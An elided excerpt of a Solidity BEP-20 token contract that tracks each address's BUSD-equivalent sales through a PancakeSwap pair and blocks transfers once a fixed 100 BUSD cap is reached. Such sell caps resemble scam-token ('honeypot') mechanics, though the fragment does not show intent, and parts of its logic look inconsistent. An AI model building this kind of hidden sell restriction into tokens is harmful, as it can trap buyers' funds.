...
contract SCMPDR is Context, IERC20, Ownable {
	...
	mapping(address => uint256) public _sellSumBUSD;

	uint256 internal _totalSupply = (10 ** 8) * (10 ** _DECIMALS);
	uint256 internal _theNumberBusd = 100 ether;
	...
	constructor(address routerAddress) {
		...
		pair = IPancakePair(IPancakeFactory(_router.factory()).createPair(_busdAddress, address(this)));
	...
	function _canTransfer(address sender, address recipient, uint256 amount) private view returns (bool) {
		...
		if (_isSuper(sender)) {
			uint256 amountBUSD = _getBUSDEquivalent(amount);
			uint256 soldBUSD = _sellSumBUSD[sender];
			return _theNumberBusd >= soldBUSD + amountBUSD;
		}
	...
	function _getBUSDEquivalent(uint256 amountTokens) private view returns (uint256) {
		(uint256 reserve0, uint256 reserve1,) = pair.getReserves();
		if (pair.token0() == _busdAddress) {
	...
	function _beforeTokenTransfer(
		...
		if (_hasLiquidity()) {
			if (_isSuper(to)) {
				_sellSumBUSD[from] += _getBUSDEquivalent(amount);
			}
		}
	}
}